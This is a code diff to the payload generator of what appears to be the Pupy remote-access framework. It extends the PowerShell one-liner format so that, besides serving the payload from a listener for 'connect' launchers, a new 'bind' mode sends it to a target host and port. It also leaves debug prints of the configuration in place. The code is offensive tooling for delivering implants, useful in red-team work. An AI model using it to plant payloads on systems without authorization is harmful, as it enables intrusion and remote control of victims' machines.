@@ -650,13 +650,27 @@ def pupygen(args, config):
         outpath = generate_ps1(conf, outpath=outpath, output_dir=args.output_dir, both=True)
     
     elif args.format=="ps1_oneliner":
-        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
-        link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
-        if args.oneliner_no_ssl == False : sslEnabled = True
-        else: sslEnabled = False
-        if args.no_use_proxy == False : useTargetProxy = True
-        else: useTargetProxy = False
-        serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
+        if conf['launcher'] in ["connect", "auto_proxy"]:
+            from pupylib.payloads.ps1_oneliner import serve_ps1_payload
+            link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
+            if args.oneliner_no_ssl == False : sslEnabled = True
+            else: sslEnabled = False
+            if args.no_use_proxy == False : useTargetProxy = True
+            else: useTargetProxy = False
+            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
+        elif conf['launcher'] == "bind":
+            from pupylib.payloads.ps1_oneliner import send_ps1_payload
+            print conf["launcher_args"]
+            print conf
+            outpath, target_ip, bind_port = "", None, None
+            bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
+            if "--oneliner-host" in conf["launcher_args"]:
+                target_ip=conf["launcher_args"][conf["launcher_args"].index("--oneliner-host")+1]
+                send_ps1_payload(conf, bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
+            else:
+                raise ValueError("You have to give me the --oneliner-host argument")
+        else:
+            raise ValueError("ps1_oneliner with {0} mode is not implemented yet".format(conf['launcher']))
     
     elif args.format=="rubber_ducky":
         rubber_ducky(conf).generateAllForOStarget()
